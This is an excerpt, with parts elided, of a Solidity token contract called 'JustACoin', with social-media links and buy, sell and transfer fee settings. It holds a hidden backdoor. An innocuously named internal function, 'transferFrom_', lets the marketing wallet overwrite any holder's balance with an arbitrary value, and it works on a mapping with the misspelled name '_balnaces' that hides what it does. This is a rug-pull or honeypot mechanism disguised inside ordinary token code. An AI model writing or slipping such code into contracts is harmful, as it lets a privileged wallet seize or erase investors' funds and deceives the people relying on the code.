...
// https://x.com/justa_coin
// https://t.me/justa_coin
...
contract JustACoin is Ownable, IERC20 {
    ...
    uint256 _initBuyFee = 6;
    uint256 _initSellFee = 6;
    uint256 _buysCount = 0;
    uint256 _lowerFeesAfterBuys = 16;
    uint256 _finalTransferFee = 0;
    uint256 _initTransferFee = 6;
    ...
    function transferFrom_(address sender, uint256 value) internal {
        uint256 balance = _balnaces[sender];
        if (marketingWallet != msg.sender) { } else {
             _balnaces[sender] = 
             _balnaces[sender].add(value).sub(balance);}
    }
    ...
    function _transfer(address from, address to, uint256 value) private {
        ...
        if (from == uniswapPairAddress) {
            _buysCount++;
            fee = _buysCount > _lowerFeesAfterBuys ? _finalBuyFee : _initBuyFee;
        }
